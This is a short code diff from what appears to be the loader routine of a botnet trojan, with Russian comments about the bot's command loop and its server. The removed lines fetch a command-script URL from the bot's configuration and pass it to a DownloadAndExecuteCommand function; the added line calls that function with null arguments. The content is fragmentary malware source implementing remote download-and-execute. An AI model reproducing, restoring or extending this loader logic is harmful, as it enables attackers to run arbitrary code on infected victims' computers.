@@ -103,21 +103,8 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	{
 		// 403_pl цикл получения команд
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
-
-		PCHAR URL = GetBotScriptURL(SCRIPT_TASK);
-
-		// Загружаем и выполняем команду
-		if (URL != NULL)
-		{
-			DLLDBG("====>Bot Loader", "Выполняем команду \r\n\URL: %s", URL);
-			DownloadAndExecuteCommand(NULL, URL);
-			STR::Free2(URL);
-			DLLDBG("====>Bot Loader", "Запрос команды завершён");
-		}
-		else
-		{
-			DLLDBG("====>Bot Loader", "Не удалось получить адрес скрипта команд");	
-		}
+		
+		DownloadAndExecuteCommand(NULL, NULL);
 
 		// "Гениальность" проектирования взаимосвязи бота и его сервера
 		// отправка стартовой информации должна идти только после получения
